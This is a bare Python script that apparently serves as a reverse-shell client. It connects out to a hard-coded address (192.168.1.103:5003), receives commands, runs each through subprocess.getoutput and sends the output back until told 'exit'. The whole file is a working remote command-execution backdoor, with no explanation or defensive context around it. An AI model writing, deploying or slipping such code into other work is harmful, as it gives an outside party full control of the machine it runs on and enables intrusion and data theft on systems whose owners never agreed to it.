import socket
import subprocess

SERVER_HOST = "192.168.1.103"
SERVER_PORT = 5003
BUFFER_SIZE = 1024

s = socket.socket()

s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)
while True:
    
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        
        break
    
    output = subprocess.getoutput(command)
    
    s.send(output.encode())

s.close()
